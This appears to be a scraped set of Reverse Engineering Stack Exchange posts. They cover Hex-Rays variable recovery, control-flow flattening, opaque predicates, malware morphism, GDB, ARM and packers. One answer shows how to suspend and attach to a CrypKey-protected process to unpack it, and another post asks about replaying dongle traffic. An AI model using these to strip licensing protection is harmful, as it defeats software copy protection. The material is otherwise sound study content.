  int v371; // [sp+14h] [bp-1607Ch]@598
  char *v372; // [sp+14h] [bp-1607Ch]@644
  int v373; // [sp+14h] [bp-1607Ch]@668
  char v374[16]; // [sp+18h] [bp-16078h]@1
  ARENA *a5[2]; // [sp+28h] [bp-16068h]@63
  int v376; // [sp+30h] [bp-16060h]@69
  int v377; // [sp+34h] [bp-1605Ch]@61
  char ExitCode[7]; // [sp+38h] [bp-16058h]@233
  char v379; // [sp+3Fh] [bp-16051h]@420
  size_t Size; // [sp+40h] [bp-16050h]@69
  int v381; // [sp+44h] [bp-1604Ch]@233
  int v382; // [sp+48h] [bp-16048h]@69
</code></pre>

<p>A bit lower you see this</p>

<pre><code>  __int16 v385; // [sp+51h] [bp-1603Fh]@527                   2
  int v386; // [sp+53h] [bp-1603Dh]@527               53-51 = 2 up [4]
  int v387; // [sp+57h] [bp-16039h]@527               57-53 = 4 up [4]
  __int16 v388; // [sp+5Bh] [bp-16035h]@527           5B-57 = 4 up [2]
  __int16 v389; // [sp+5Dh] [bp-16033h]@527           5D-5B = 2 up [3] ???
  int v390; // [sp+60h] [bp-16030h]@233               60-5D = 3 up
</code></pre>

<p>Why is that one 3 bytes when it's a <code>__int16</code> or is it a <code>char[3]</code> ?</p>

<p>After I translated it to</p>

<pre><code>  int v386; // [sp+53h] [bp-1603Dh]@527
  int v387; // [sp+57h] [bp-16039h]@527
  __int16 v388; // [sp+5Bh] [bp-16035h]@527
  char v389[3]; // [sp+5Dh] [bp-16033h]@527
  int v390; // [sp+60h] [bp-16030h]@233
</code></pre>

<p>Now it does something like this in code, so it must of been <code>__int16</code> after all. Maybe it's a <code>__int16</code> followed by a <code>char</code> after, but you can't do that in Hex-Rays afaik.</p>

<pre><code>                *(_WORD *)v389 = v236;
</code></pre>

<p>Okay it's highly unpredictable and I don't think I can rely on the <code>[so+###h]</code>'s too much just in some cases.</p>

<p>I managed to get it down to this, but it has problems all over the place</p>

<p>Trimmed off the top stuff that didn't change</p>

<pre><code>  char *v351; // [sp+4h] [bp-1608Ch]@668
  const char *v352; // [sp+8h] [bp-16088h]@668
  char *v353; // [sp+Ch] [bp-16084h]@52
  char *v354; // [sp+Ch] [bp-16084h]@351
  char *v355; // [sp+Ch] [bp-16084h]@598
  char *v356; // [sp+Ch] [bp-16084h]@644
  int v357; // [sp+Ch] [bp-16084h]@668
  const char *v358; // [sp+10h] [bp-16080h]@52
  char *v359; // [sp+10h] [bp-16080h]@57
  char *v360; // [sp+10h] [bp-16080h]@218
  const char *v361; // [sp+10h] [bp-16080h]@351
  int v362; // [sp+10h] [bp-16080h]@525
  const char *v363; // [sp+10h] [bp-16080h]@598
  const char *v364; // [sp+10h] [bp-16080h]@644
  int v365; // [sp+10h] [bp-16080h]@668
  int v366; // [sp+14h] [bp-1607Ch]@52
  char v367; // [sp+14h] [bp-1607Ch]@54
  char v368; // [sp+14h] [bp-1607Ch]@218
  int v369; // [sp+14h] [bp-1607Ch]@351
  int v370; // [sp+14h] [bp-1607Ch]@525
  int v371; // [sp+14h] [bp-1607Ch]@598
  char *v372; // [sp+14h] [bp-1607Ch]@644
  int v373; // [sp+14h] [bp-1607Ch]@668
  char v374[16]; // [sp+18h] [bp-16078h]@1
  ARENA *a5[2]; // [sp+28h] [bp-16068h]@63
  int v376; // [sp+30h] [bp-16060h]@69
  int v377; // [sp+34h] [bp-1605Ch]@61
  char ExitCode[7]; // [sp+38h] [bp-16058h]@233
  char v379; // [sp+3Fh] [bp-16051h]@420
  size_t Size; // [sp+40h] [bp-16050h]@69
  int v381; // [sp+44h] [bp-1604Ch]@233
  int v382; // [sp+48h] [bp-16048h]@69
  int v383; // [sp+4Ch] [bp-16044h]@69
  char v384; // [sp+50h] [bp-16040h]@527
  __int16 v385; // [sp+51h] [bp-1603Fh]@527
  int v386; // [sp+53h] [bp-1603Dh]@527
  int v387; // [sp+57h] [bp-16039h]@527
  __int16 v388; // [sp+5Bh] [bp-16035h]@527
  char v389[3]; // [sp+5Dh] [bp-16033h]@527
  int v390; // [sp+60h] [bp-16030h]@233
  char array1[32]; // [sp+64h] [bp-1602Ch]@157
  char array2[256]; // [sp+84h] [bp-1600Ch]@52
  char Dest[256]; // [sp+184h] [bp-15F0Ch]@69
  char Str1[64]; // [sp+284h] [bp-15E0Ch]@153
  char AppName[64]; // [sp+2C4h] [bp-15DCCh]@76
  char buf[512]; // [sp+304h] [bp-15D8Ch]@45
  char StartupInfo[256]; // [sp+504h] [bp-15B8Ch]@163
  char v398[512]; // [sp+604h] [bp-15A8Ch]@741
  char v399[8192]; // [sp+804h] [bp-1588Ch]@638
  char v400[80000]; // [sp+2804h] [bp-1388Ch]@543
  int v401; // [sp+16084h] [bp-Ch]@1
  int (*v402)(); // [sp+16088h] [bp-8h]@1
  int v403; // [sp+1608Ch] [bp-4h]@1
  const char *Buf1b; // [sp+160A0h] [bp+10h]@485
  const char *Buf1a; // [sp+160A0h] [bp+10h]@489
</code></pre>

<p>Seems all the array/buffers are only found at the bottom of all the variables all of them are buffers completely (maybe it's just the type of compiler / optimizer this program used). </p>

<p>I wonder what If it probably reuses all the buffers as just one big buffer?</p>
","<p>I'm not sure that it is possible to answer this question without seeing all the function because correctness of local variable type recovery can be done only by understanding of the context where variables are used. </p>

<p>However, I'd suggest the following algorithm for dealing with local variables 
in Hex-Rays:</p>

<ol>
<li><p>As your friend said, do nothing with variables allocated on the registers.</p></li>
<li><p>For all other variables allocated on the stack, do the following:</p></li>
<li><p>Look where this variable is used.</p></li>
<li><p>If you see one of patterns below, act accordingly, but press F5 after each change and review results. Remember, you can revert each type back by pressing Y and entering previous type on it.</p></li>
<li><p>If you see usage of some <strong>different</strong> offsets relative to this variable it may be a structure. Try to create one by right-click on the variable and choosing corresponding menu item. Usage of this variable as function parameter or other connections to already known types may give you a hint about type of the variable. </p></li>
<li><p>If you see not constant offsets (such as offset in another variable) it can be array. Press asterisk (*) on the variable, IDA will suggest the length of the array, it does it relatively good.</p></li>
<li><p>If you see both of those patterns, it is possibly array of structures or more complicated case like array of structures in structure which is member of array and vice versa :) In this case try to find a smallest structure/array and start with it.  </p></li>
</ol>

<p>At all, there are the following possibilities to affect the function stack in Hex-Rays:</p>

<ol>
<li>Changing variable type (press y on the variable, enter type) </li>
<li>Making variable an array (press * on it) </li>
<li>Creating new structure
type on a variable basis (Right click on the variable, corresponding
menu item)</li>
<li>Undefining a variable: Doubleclick on stack variable
will open stack function stack window. Pressing u on a variable will
undefine it. </li>
<li>Merging a variable: if you see that two different
variables are actually the same you can press = and tell to the
decompiler that they are really the same. AFAIR it works in IDA 6.5
and IDA6.5</li>
</ol>

<p>Don't forget to refresh the decompiled code view by pressing F5 after each change to see results.</p>

<p>That's all.</p>

<p>By the way,  there is one point you are probably missing:
IDA and HexRays can make more than one variable on the same place in stack, 
so v369, v370, v371, v372, v373 are using same place in the stack, but are different variables from decompiled code point of view.</p>
","4119"
"What is a ""control-flow flattening"" obfuscation technique?","5722","","<p>I recently heard about the ""control-flow flattening"" obfuscation which seems to be is used to break the structure of the CFG of the binary program (see <a href=""http://diablo.elis.ugent.be/obfuscation"" rel=""noreferrer"">Diablo obfuscation module</a> and <a href=""https://www.sstic.org/2013/presentation/execution_symbolique_et_CFG_flattening/"" rel=""noreferrer"">Symbolic Execution and CFG Flattening</a>). </p>

<p>Can somebody make an explanation of what is its basic principle and, also, how to produce such obfuscation (tools, programming technique, ...) ? And, it would be nice to know if there are ways to extract the real shape of the control-flow of the program.</p>
","<p>For a good example of this obfuscation, check Apple's FairPlay code, e.g. iTunes or iOS libs. Here's a typical graph of a function which had this obfuscation applied:</p>

<p><img src=""https://i.stack.imgur.com/Xk4L6.png"" alt=""enter image description here""></p>

<p>As you can see, all edges between basic blocks - both conditional and unconditional - has been redirected to a dispatcher node which uses a new artificial variable to decide which block should be jumped to next. This variable is updated at the end of each separated basic block.</p>

<p>Here's the dispatcher node:</p>

<pre><code>LDR    R3, =0xF26A85D2
ADD    R3, R2, R3
CMP    R3, #0x40 ; switch 65 cases
ADDLS  PC, PC, R3,LSL#2 ; switch jump
</code></pre>

<p>It uses <code>R2</code> as the control value.</p>

<p>And here's one of the basic blocks:</p>

<pre><code>LDR  R2, =0x853FD863 ; jumptable 00532EFC case 33
LDR  R1, [SP,#0x130+var_108]
STR  R2, [SP,#0x130+var_134]
LDR  R2, =0xD957A31
STR  R1, [SP,#0x130+var_44]
B    loc_532ED0
</code></pre>

<p>It updates <code>R2</code> with the value which will be used to jump to the next block.</p>

<p>Recovering it shouldn't be <em>too</em> difficult in most cases - just track the control variable updates and replace jumps to the dispatcher node with jumps to the next block corresponding to the new control variable value.</p>
","2224"
"What are the targets of professional reverse software engineering?","5687","","<p>At the professional level, for what purpose is reverse software engineering used? What software is targeted and why?</p>

<p>For reasonably complex compiled code that's doing something novel, making meaningful insights into how that code operates via reverse engineering seems like it would be enormously intensive of expertise, labor, and time. In particular, I imagine that hiring competent assembly programmers is extremely difficult and possibly expensive. And yet, I haven't the foggiest idea where entities with the resources to do so would want to spend those resources.</p>

<p>This is my list of possibilities...</p>

<ol>
<li>Writing malware</li>
<li>Writing counter-malware</li>
<li>Maybe analyzing competitors products?</li>
</ol>

<p>It's not a great list. What is the reality here? What sort of software justifies the expense to be reverse engineered?</p>

<p><em>See the comments on 0xC0000022L's answer for some refinement of the question.</em></p>
","<p>Reverse engineering is commonly used in many ways.  Here is a list of just some of the most common professional activities where reverse engineering is involved.</p>

<ol>
<li>Malware research. Withouth doing reverse engineering, it's hard to determine what an actual piece of malware does, how and, more important, how to clean it or prevent infections.</li>
<li>Plagiarism detection: Reverse engineering is often legally used to determine if company or particular X plagiarized code from company or particular Y.</li>
<li>Forensics.</li>
<li>Compatibility. Reverse engineering supported, and still does, many open source projects like Samba or Star/Libre/OpenOffice. Without professional (and hobbistic) reverse engineers, nobody would have been able to write a software like the previous ones as there was no specification available at all for the protocols or file formats involved. If you're using Libre/OpenOffice or MacOSX or Linux, you're actually using the result of the work of many reverse engineers during many years.</li>
<li>Vulnerability research/development. In order to discover undocumented features, vulnerabilities or backdoors left by the company, programmers or a 3rd party, reverse engineering is naturally required.</li>
<li>Modification of legacy programs. This is one of the most other common tasks I have seen in this field: company X bought program Y but the company producing it, Z, disappeared and they have no source code at all. That company X contracts reverse engineering services to fix bugs and/or adapt the old (dead) application for their own purposes. If the program was also protected, the reverse engineers would also need to first break the the copy protection.</li>
<li>Analysing competitors products. Naturally, this is a very common thing. Specially when talking about hardware products. And it, by the way, happens in all fields. Do you think that Porsche doesn't reverse engineer Ferrari cars and the other way around?</li>
<li>Source code recovery. Company X lost the source code of one of their programs/products for whatever reason and they only have the binaries. That company contracts reverse engineering services to reconstruct/recover the source code.</li>
<li>Analysing foreign governments hardware and software. You get the idea.</li>
<li>Binary patches development. Some products cannot be fixed because they are very slow fixing bugs (Oracle comes to mind...) or the company disappeared or simply don't care. In this case, reverse engineering services can be contracted to develop binary patches to be applied to the product in order to fix bugs or vulnerabilities.</li>
</ol>

<p>I could continue writing down more professional task that reverse engineers often do, but I think this list gives you a general idea.</p>
","6458"
"IDA Convert to Unicode","5635","","<p>In IDA 5.0 Freeware how do you convert a block of data into a unicode string, the only thing I can find is to convert it into an ascii string.</p>

<pre><code>db 'a'
db 0
db 'b'
db 0
db 'c'
db 0
db 'd'
db 0
db 0
db 0
</code></pre>

<p>into</p>

<pre><code>unicode &lt;abcd&gt;, 0
</code></pre>
","<p>Press <kbd>Alt</kbd>-<kbd>A</kbd> to bring up the ""string style"" dialog, from which you can create a string of various types (including Unicode).  Through this dialog, you can optionally set the default string type that is created when you press <kbd>a</kbd> (i.e., you can make it such that Unicode is the default if you want).</p>

<p>Alternatively use <kbd>Alt</kbd>+<kbd>A</kbd> <kbd>U</kbd> as pointed out by <a href=""https://reverseengineering.stackexchange.com/users/111/joxeankoret"">joxeankoret</a> in the comment.</p>
","1735"
"When to use Windbg and Ollydbg?","5511","","<p>According to what I know :WinDbg uses debugging information (pdb/symbol files) for debugging.So ,for example say I get a unknown exe (malicious) can I debug it since I'll not be having its .pdb. Is WinDbg best suited to analyze memory dumps and crash issues only?</p>

<p>Ollydbg being a ring 3 debugger is good to analyze/debug malicious exe's but doens't support unknown dlls(there is loaddll but you have to know which function the dll exports and there parameters) and rootkits(sys files).</p>

<p>So If I have a dll and a .sys file how can I debug it using olly or winDbg?</p>

<p>Note:I am a noob I may be wrong in what I know.I don't have the resources to buy IDAPro :-). </p>
","<p>Even the <a href=""https://www.hex-rays.com/products/ida/support/download_freeware.shtml"" rel=""nofollow"">free version of IDA Pro</a> is worth having. Finding the general structure of an unknown binary is much easier with it than with anything else. If you have an unknown DLL, it will show you which exports it has, and looking at the assembly code helps you guess the parameters.</p>

<p>In most cases, to debug a .dll, you'll want to write a small program to call several of its exports one after another anyway. You can use ollydbg or windbg to load your .exe and trace through the .dll code.</p>

<p>My personal experience is that in many cases, the best approach would be using IDA first to get an overview over the unknown binary, then use ollydbg or the IDA debugger to trace on the processor instruction level, and only use a high level debugger when i have some symbols to trace on the source code level.</p>

<p>I have bought IDA and i think the current version of the debugger is much better than the free 5.0 one, so you might want to skip the IDA debugger entirely, but you'll still use it for static analysis. And i tend to use Linux much more than Windows (and if on windows, use IDA or Ollydbg), so i have a lot more experience with gdb than with windbg.</p>

<p>Still, each of these tools has its strenghs and weaknesses, and if you seriously want to go into binary analysis, you'll need each of them in the long run. If i were you, i'd invest a day or two into each of them. Once you're comfortable with them, you'll find you'll use each of them depending depending on your specific situation.</p>
","8624"
"What is an ""opaque predicate""?","5450","","<p>I saw the term of <em>opaque predicates</em> several times in obfuscation papers. As far as I understand it, it refers to predicates that are hard to evaluate in an automated manner. Placing it at strategical points of the program (<code>jmp</code>, <code>test</code>, ...) can mislead the analysis of a program by automatic tools.</p>

<p>My definition is lacking of precision and, moreover, I have no idea on how to estimate the <em>opacity</em> of such a predicate (its efficiency). So, can somebody give a proper definition and maybe a few examples ?</p>
","<p>The answers already in this thread are good ones.  In a nutshell, an opaque predicate is ""something that a program analysis might miss, if the program analysis is not sophisticated enough"".  Denis' example was based on the inverse of constant propagation, and served as an anti-checksum mechanism.  Joxean's <code>SetErrorMode</code> example was an environment-based opaque predicate that was used for dynamic anti-emulation.  Two of Ange's answers were also dynamic anti-emulation; based upon the environment, and based upon uncommon platform features.  Ange's other example was more like an anti-disassembly trick via indirect addressing.</p>

<p>In the academic literature, an opaque predicate is referred to as a branch that always executes in one direction, which is known to the creator of the program, and which is unknown a priori to the analyzer.  The notion of ""hardness"" of an opaque predicate is deliberately omitted from this definition.  Academic predicates are often based upon number-theoretic constructions, aliasing relationships, recursive data structures; basically anything that is commonly understood by program analysis researchers to cause problems for a program analysis tool.  </p>

<p>My favorite researcher Mila Dalla Preda has shown that the ability for an abstract interpreter to break a given category of opaque predicate is related to the ""completeness"" of the domain with respect to the property tested by the predicate.  She demonstrates by using mod-k-based opaque predicates, and elicits a family of domains that are complete (i.e. incur no abstract precision loss) for mod-k with respect to common transformers (addition, multiplication, etc).  Then she explores the use of obscure theoretical constructions such as completeness refinement to automatically construct a domain for breaking a certain category of predicate.  See <a href=""http://profs.sci.univr.it/~dallapre/AMAST06.pdf"">this paper</a> for more details.</p>
","1679"
"Are there any tools or scripts for identifying compression algorithms in executables?","5443","","<p>I know there are tools for identifying common ciphers and hash algorithms in code, but are there any similar scripts / tools / plugins for common compression algorithms such as gzip, deflate, etc? Primarily aimed at x86 and Windows, but answers for other platforms are welcomed too.</p>

<p>Note that I'm looking to find <em>code</em>, not <em>data</em>.</p>
","<p><a href=""http://aluigi.altervista.org/mytoolz.htm#signsrch"" rel=""nofollow noreferrer""><code>signsrch</code></a> by Luigi Auriemma has signatures for tables used in common compression libraries (zlib etc.). </p>

<p><img src=""https://i.stack.imgur.com/kNa4o.png"" alt=""enter image description here""></p>

<p>It has been ported as plugins for <a href=""http://www.autistici.org/ratsoul/iss.html"" rel=""nofollow noreferrer"">ImmDbg</a> and <a href=""http://www.macromonkey.com/bb/viewtopic.php?f=65&amp;t=886"" rel=""nofollow noreferrer"">IDA</a>.</p>

<p>He also has the <a href=""http://aluigi.altervista.org/mytoolz.htm#offzip"" rel=""nofollow noreferrer""><code>offzip</code></a> tool which tries to identify and unpack compressed streams inside a binary.</p>
","1470"
"Set a breakpoint on GDB entry point for stripped PIE binaries without disabling ASLR","5376","","<p>Given a position-independent, statically-linked, stripped binary, there does not appear to be a way in GDB to set a breakpoint at the entry point without disabling ASLR.</p>

<ul>
<li><code>break start</code> and similar functions do not work, because there is no symbolic information</li>
<li><code>set stop-on-solib-events 1</code> does not work as the binary is not dynamically linked</li>
<li><code>break *0xdeadbeef</code> for the entry point does not work, as the entry point is unresolved until the binary starts</li>
<li><code>catch load</code> does not work, as it does not load any libraries</li>
<li><code>start</code> does not work, as <code>main</code> is not defined and no libraries are loaded</li>
</ul>

<p>Without patching the binary, what mechanism can I use to break at the first instruction executed?</p>

<h2>Possible?</h2>

<p>Since a now-deleted response to the question said that a PIE statically-linked binary is impossible, a trivial example is the linker itself.</p>

<p>It is statically linked.</p>

<pre><code>$ ldd /lib/x86_64-linux-gnu/ld-2.19.so
    statically linked
</code></pre>

<p>It is executable.</p>

<pre><code>$ strace /lib/x86_64-linux-gnu/ld-2.19.so
execve(""/lib/x86_64-linux-gnu/ld-2.19.so"", [""/lib/x86_64-linux-gnu/ld-2.19.so""], [/* 96 vars */]) = 0
brk(0)                                  = 0x7ff787b3d000
writev(2, [{""Usage: ld.so [OPTION]... EXECUTA""..., 1373}], 1Usage: ld.so [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]
</code></pre>

<p>It is position-independent.</p>

<pre><code>$ readelf -h /lib/x86_64-linux-gnu/ld-2.19.so | grep DYN
  Type:                              DYN (Shared object file)
</code></pre>

<h2>Solutions</h2>

<p>It looks like this can be done with Python by utilizing some of the events made available: <a href=""http://asciinema.org/a/19078"" rel=""noreferrer"">http://asciinema.org/a/19078</a></p>

<p>However, I'd like a native-GDB solution.</p>

<p>A successful solution will break at <code>_start</code> in ld.so when executed directly without disabling ASLR.  It should look something like this:</p>

<pre><code>sh $ strip -s /lib/x86_64-linux-gnu/ld-2.19.so -o ld.so
sh $ gdb ./ld.so
(gdb) $ set disable-randomization off
(gdb) $ &lt;your magic commands&gt;
(gdb) $ x/i $pc
=&gt; 0x7f9ba515d2d0:     mov    rdi,rsp
(gdb) $ info proc map
process 10432
Mapped address spaces:

        Start Addr           End Addr       Size     Offset objfile
    0x7f9ba515c000     0x7f9ba517f000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.19.so 
    0x7f9ba537e000     0x7f9ba5380000     0x2000    0x22000 /lib/x86_64- linux-gnu/ld-2.19.so
    0x7f9ba5380000     0x7f9ba5381000     0x1000        0x0 
    0x7fffc34c7000     0x7fffc38ca000   0x403000        0x0 [stack]
    0x7fffc398b000     0x7fffc398d000     0x2000        0x0 [vdso]
0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
</code></pre>
","<p>Setting a breakpoint on an unmapped address before starting the target process does this, effectively.  It's not correct functionality, but rather a side-effect of the failure to set the breakpoint.</p>

<pre><code>(gdb) break *0
Breakpoint 1 at 0x0
(gdb) r
Starting program: /home/user/ld.so 
Error in re-setting breakpoint 1: Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x0

Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x0

(gdb) x/i $pc
=&gt; 0x7faae3a25cd0:      mov    rdi,rsp
</code></pre>
","8748"
"What are the differences between metamorphic, oligomorphic and polymorphic malware?","5351","","<p>Malware use several methods to evade anti-virus software, one is to change their code when they are replicating. I saw mainly three type of techniques in the wild which are: <em>metamorphic malware</em>, <em>oligomorphic malware</em> and <em>polymorphic malware</em> (I might have missed one). What are the main differences between theses techniques and what do they do ?</p>
","<p>In order of increasing complexity: oligomorphic, polymorphic, metamorphic.</p>

<p>The first two terms are generally applied to decryptors.  We (anti-virus industry) define them this way: oligomorphic - decryptor with few variable elements, which does not affect the size or shape of the code.  It means that the variable elements are usually fixed-size instructions, but it can also apply to the register initialization.</p>

<h1>Oligomorphic example</h1>

<pre><code>std ;fake, might be replaced by cld / nop / xchg ax, cx / ...
mov cx, size
mov ax, ax ;fake, might be replaced by mov bx, bx / or cx, cx / ...
mov si, decrypt_src
cld ;fake
mov di, decrypt_dst
or ax, ax ;fake
mov bl, key
and bp, bp ;fake
decrypt:
xor [di], bl
xchg dx, ax ;fake
inc di
cld ;fake
loop decrypt
</code></pre>

<p>In this case, the <code>di</code> register could be exchanged with <code>si</code>, for example.  Very simple replacement.</p>

<h1>Polymorphic</h1>

<p>decryptor with potentially highly variable elements, which does affect the size and/or shape of the code.  It means that all kinds of changes can be applied, including subroutine creation, large blocks of garbage instructions, code ""islands"", or even algorithmic register initialisation (example <a href=""http://pferrie.host22.com/papers/bounds.pdf"" rel=""nofollow"">here</a>).</p>

<h1>Metamorphic</h1>

<p>highly variable elements are applied directly to the body.  There is generally no decryptor in this case.  The same techniques for polymorphism are applied to the code itself.  The most famous example of this is the Simile virus from 2002 (details <a href=""http://pferrie.host22.com/papers/simile.pdf"" rel=""nofollow"">here</a>).  There's a detailed paper on the subject with actual examples <a href=""http://pferrie.host22.com/papers/metamorp.pdf"" rel=""nofollow"">here</a>)</p>
","1707"
"How to predict address space layout differences between real and gdb-controlled executions?","5242","","<p>It's something that puzzle me for a long time. I can observe that there is a difference between the real execution of a program and the <code>gdb</code>-controlled one.</p>

<p>But, here is an example:</p>

<ol>
<li><p>First, here is the example code (we use an automatic variable to get the location of the stack):</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main ()
{
  char c = 0;

  printf (""Stack address: %p\n"", &amp;c);

  return EXIT_SUCCESS;
}
</code></pre></li>
<li><p>Then, we disable the ASLR (we use the personality flags of the process and not the system-wide method through <code>/proc/sys/kernel/randomize_va_space</code>):</p>

<pre><code>$&gt; setarch `uname -m` -R /bin/bash
</code></pre></li>
<li><p>Then, get a run in the real memory environment:</p>

<pre><code>Stack address: 0x7fffffffe1df
</code></pre></li>
<li><p>And, the same through <code>gdb</code>:</p>

<pre><code> (gdb) r
 Starting program: ./gdb-against-reality
 Stack address: 0x7fffffffe17f
 [Inferior 1 (process 5374) exited normally]
 (gdb) 
</code></pre></li>
</ol>

<p>So, here we have a difference of 96 bytes between the two runs. But, how can I predict this difference for a given program without having it running in the <em>real</em> memory layout (just by knowing the <code>gdb</code> memory layout) ?</p>

<p>And, also, from where/what is coming this difference ?</p>
","<p>There could be other factors involved, but my guess would be that changes in the process environment variables, which are stored on the stack, are what's causing this issue.</p>

<p>Running a small <a href=""https://stackoverflow.com/questions/2085302/printing-all-environment-variables-in-c-c"">program</a> that just prints out the environment variables reveals a couple variations in environment variables when run inside vs outside gdb on my system.</p>

<pre><code>int main(int argc, char **argv, char** envp)
{
  char** env;
  for (env = envp; *env != 0; env++)
  {
    char* thisEnv = *env;
    printf(""%s\n"", thisEnv);    
  }
}
</code></pre>

<p>First, when running under gdb, there is a LINES variable that isn't present when the process is started outside of gdb:</p>

<pre><code>LINES=83
</code></pre>

<p>Secondly, the underscore environment variable is different. When running outside of gdb, it is set to the name of the executable:</p>

<pre><code>_=./gdbtest
</code></pre>

<p>But when started from inside gdb, it is set to the path of the gdb binary:</p>

<pre><code>_=/usr/bin/gdb
</code></pre>

<p>You can try to run the program normally, then attach to it with gdb/gdbserver, which should avoid these variations in environment variables (assuming that is in fact what is causing your problem).</p>

<p>If your process is short-lived, it can be hard to pause the process before it exits. Maybe someone else has some good suggestions on starting a process in a paused state; I usually use a second program like <a href=""https://code.google.com/p/botox/source/browse/trunk/src/botox.c"" rel=""nofollow noreferrer"">this one</a> to catch the process as it is starting and pause it so I can attach a debugger to it.</p>
","2988"
"Ollydbg and IDA Pro unable to attach to process","5240","","<p>I have a target application protected with CrypKey.
When i try to attach to the apps in OllyDbg and Ida Pro i receive Unable to attach to this process.</p>

<p>The bad news is that i want to unpack the main exe after executing of Crypkey loader but after patching main exe and loader to obtain an infinite loop at the end of the code of the loader i am unable to attach to main exe and reach the OEP.</p>

<p>Do you know how or why i am unable to attack? A good solution in this cases?</p>

<p>Thank you very much</p>

<p>See image below:</p>

<p><img src=""https://i.stack.imgur.com/vec2o.png"" alt=""enter image description here""></p>
","<p>Debug the loader.</p>

<p>Set a breakpoint on <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx"" rel=""nofollow""><code>CreateProcess</code></a> <em>(or <a href=""http://undocumented.ntinternals.net/source/usermode/undocumented%20functions/nt%20objects/process/ntcreateprocess.html"" rel=""nofollow""><code>ZwCreateProcess</code></a> if needed)</em></p>

<p>When the breakpoint is hit modify the <em><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684863(v=vs.85).aspx"" rel=""nofollow"">process creation flags</a></em> on the stack to include <code>CREATE_SUSPENDED</code>. 
Make sure to remove any debugging related flags such as <code>DEBUG_ONLY_THIS_PROCESS</code> etc.</p>

<p>Single step over the <code>CreateProcess</code> call. At this point, the child process would be created in a suspended state. Now you should be able to attach a debugger to this.</p>
","6431"
"Is there any simple open source Windows packer?","5200","","<p>There are great questions here about different types of packers and that is very interesting to me.  I would like to try my hand at reverse engineering one.  Since I am very new to this, I would like the source code as well.</p>

<p>I am hoping that by continuously compiling and recompiling the source, I can learn to match it up in IDA Pro and gain a better understanding of both topics at once.</p>

<p>I've checked out the source code for UPX but it is very complex as it handles many different platforms and types.  </p>

<p>Is there an open source code packer that deals exclusively with Windows executables and is <strong>very simple</strong> to understand?</p>
","<ul>
<li><p><a href=""http://mordor.in/"">SimplePack</a> is <em>simple</em> and open-source (albeit in ASM, not in C)</p>

<p>SimplePack is not <em>trivial</em>, yet simple enough so that I typically use it myself as a first 'hands-on' for binary packer training.</p></li>
<li><p>also, my minimalists packers (<a href=""https://code.google.com/p/corkami/source/browse/#svn%2Ftrunk%2Fwip%2FMakePE%2Fexamples%2Fpacker"">source</a>/<a href=""http://corkami.googlecode.com/files/mini_packers.zip"">binaries</a>) in python (EP-patcher, compresser, cryptor, dropper, protecter, virtualizer, mutater). No  real use, but made as smallest possible examples for studies.</p></li>
<li>For reference only, <a href=""http://hem.passagen.se/polyene/"">PolyEnE</a> is also open-source (in ASM, again), but not very simple - YMMV.</li>
</ul>
","1801"
"What do the following ARM instructions mean?","5155","","<p>I have some ARMv7 instructions that I do not understand, despite reading the reference at: <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0040d/Cihcaahe.html"" rel=""nofollow"">ARM Information Center</a></p>

<p>In the context of:</p>

<pre><code>  a7a4d8:   b530        push    {r4, r5, lr}
  a7a4da:   466c        mov r4, sp
  a7a4dc:   4605        mov r5, r0
  a7a4de:   682a        ldr r2, [r5, #0]
  a7a4e0:   ebad 0d02   sub.w   sp, sp, r2
  a7a4e4:   f104 0014   add.w   r0, r4, #20 ; 0x14
  a7a4e8:   4669        mov r1, sp
  a7a4ea:   b082        sub sp, #8
  a7a4ec:   466a        mov r2, sp
  a7a4ee:   462b        mov r3, r5
  a7a4f0:   f746 f1b8   bl  5c0864 &lt;RoutineName&gt;
  a7a4f4:   9800        ldr r0, [sp, #0]
  a7a4f6:   9901        ldr r1, [sp, #4]
  a7a4f8:   46a5        mov sp, r4
  a7a4fa:   bd30        pop {r4, r5, pc}
</code></pre>

<p>What does the following do? Can someone explain in terms of pseudo-code?</p>

<pre><code>  a7a4de:   682a        ldr r2, [r5, #0]
  a7a4e0:   ebad 0d02   sub.w   sp, sp, r2
  a7a4e4:   f104 0014   add.w   r0, r4, #20 ; 0x14

  a7a4f4:   9800        ldr r0, [sp, #0]
  a7a4f6:   9901        ldr r1, [sp, #4]
</code></pre>
","<p><code>ldr r2, [r5, #0]</code><br>
means r2=*(r5+0)<br>
which loads the value pointed to by r5 and places it in r2.<br><br></p>

<p><code>sub.w   sp, sp, r2</code><br>
means sp=sp-r2<br>
which subtracts sp by the value in r2 (to allocate stack space).<br><br></p>

<p><code>add.w   r0, r4, #20 ; 0x14</code><br>
means r0=r4+20<br>
which adds 20 (decimal) to r4 and places the result in r0.<br><br></p>

<p><code>ldr r0, [sp, #0]</code><br>
means r0=*(sp+0)<br>
which loads the value pointed to by sp and places it in r0.<br><br></p>

<p><code>ldr r1, [sp, #4]</code><br>
means r1=*(sp+4)<br>
which loads the value pointed to by (sp+4) and places it in r1.<br><br></p>

<p>In C pseudo-code it looks something like this:</p>

<pre><code>x_a7a4d8(dword *ptr_allocsize, void *arg1)
{
  alloca(*ptr_allocsize)
  dword p2;
  qword p1;
  x_5c0864(&amp;arg1, &amp;p1, &amp;p2, ptr_allocsize)
  return p1;
}
</code></pre>

<p>so it allocates some space for the value returned by the 5c0864 routine (because it uses the stack to return the value), calls the 5c0864 routine, and returns the value returned by 5c0864.</p>
","2829"
"USB Dongle Traffic Monitoring","5117","","<p>How can I monitor a usb dongle's traffic? I would like to see how a program and its usb dongle talk to each other, if it is possible replay this traffic?</p>

<p>Since I am new to this type of thing, any tutorial or tool suggestion is welcome.</p>
